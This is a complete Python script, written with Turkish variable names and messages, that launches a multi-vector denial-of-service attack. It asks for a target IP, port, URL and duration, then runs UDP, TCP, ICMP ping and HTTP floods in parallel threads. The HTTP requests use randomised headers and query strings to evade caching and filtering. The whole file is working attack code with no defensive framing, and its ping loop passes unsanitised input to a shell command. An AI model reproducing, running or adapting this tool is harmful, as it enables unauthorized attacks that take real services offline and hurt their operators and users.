import socket
import random
import time
import threading
import os
import requests


headers_useragents = [
    'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
    'Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18'
]

headers_referers = [
    'http://www.google.com/?q=',
    'http://www.bing.com/search?q=',
    'http://search.yahoo.com/search?p='
]

def buildblock(size=5):
    out_str = ''
    for _ in range(size):
        out_str += chr(random.randint(65, 90))  # A–Z
    return out_str

def http_request(hedef_url):
    """HTTP flood mantığında tek bir HTTP isteği gönderir"""
    if "?" in hedef_url:
        param_joiner = "&"
    else:
        param_joiner = "?"
    full_url = hedef_url + param_joiner + buildblock(random.randint(3, 10)) + "=" + buildblock(random.randint(3, 10))

    headers = {
        'User-Agent': random.choice(headers_useragents),
        'Cache-Control': 'no-cache',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Referer': random.choice(headers_referers) + buildblock(random.randint(5, 10)),
        'Keep-Alive': str(random.randint(110, 120)),
        'Connection': 'keep-alive'
    }

    try:
        requests.get(full_url, headers=headers, timeout=2)
    except requests.exceptions.RequestException:
        pass




def udp_flood(hedef_ip, hedef_port, sure):
    print("\nUDP Flood saldırısı başlatılıyor")
    bitis_zamani = time.time() + sure
    soket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    veri_paketi = random._urandom(1024 * 64)
    gonderilen_paket_sayisi = 0

    while time.time() < bitis_zamani:
        soket.sendto(veri_paketi, (hedef_ip, hedef_port))
        gonderilen_paket_sayisi += 1
        print(f"[UDP] {gonderilen_paket_sayisi}. paket {hedef_ip}:{hedef_port} gönderildi")


def tcp_flood(hedef_ip, hedef_port, sure):
    print("\nTCP Flood saldırısı başlatılıyor")
    bitis_zamani = time.time() + sure
    gonderilen_paket_sayisi = 0

    while time.time() < bitis_zamani:
        try:
            soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            soket.connect((hedef_ip, hedef_port))
            soket.send(random._urandom(1024))
            gonderilen_paket_sayisi += 1
            print(f"[TCP] {gonderilen_paket_sayisi}. paket {hedef_ip}:{hedef_port} gönderildi")
            soket.close()
        except:
            pass


def icmp_flood(hedef_ip, sure):
    print("\nICMP Flood saldırısı başlatılıyor")
    bitis_zamani = time.time() + sure
    while time.time() < bitis_zamani:
        os.system(f"ping -c 1 {hedef_ip} > /dev/null")
        print(f"[ICMP] Ping hedefe gönderildi: {hedef_ip}")


def http_flood(hedef_url, sure):
    print("\nHTTP Flood saldırısı başlatılıyor...")
    bitis_zamani = time.time() + sure
    gonderilen_paket_sayisi = 0

    while time.time() < bitis_zamani:
        http_request(hedef_url)
        gonderilen_paket_sayisi += 1
        print(f"[HTTP] {gonderilen_paket_sayisi}. HTTP isteği gönderildi: {hedef_url}")




def main():
    print("Multi-Flood + HTTP Flood denemesidir\n")

    hedef_ip = input("Hedef IP Adresi: ")
    hedef_port = int(input("Hedef Port Numarası: "))
    hedef_url = input("Hedef URL (HTTP Flood için): ")
    sure = int(input("Saldırı Süresi (saniye): "))

    threads = []

    udp_thread = threading.Thread(target=udp_flood, args=(hedef_ip, hedef_port, sure))
    udp_thread.start()
    threads.append(udp_thread)

    tcp_thread = threading.Thread(target=tcp_flood, args=(hedef_ip, hedef_port, sure))
    tcp_thread.start()
    threads.append(tcp_thread)

    icmp_thread = threading.Thread(target=icmp_flood, args=(hedef_ip, sure))
    icmp_thread.start()
    threads.append(icmp_thread)

    http_thread = threading.Thread(target=http_flood, args=(hedef_url, sure))
    http_thread.start()
    threads.append(http_thread)

    for thread in threads:
        thread.join()

    print("\nBitti")


if __name__ == "__main__":
    main()

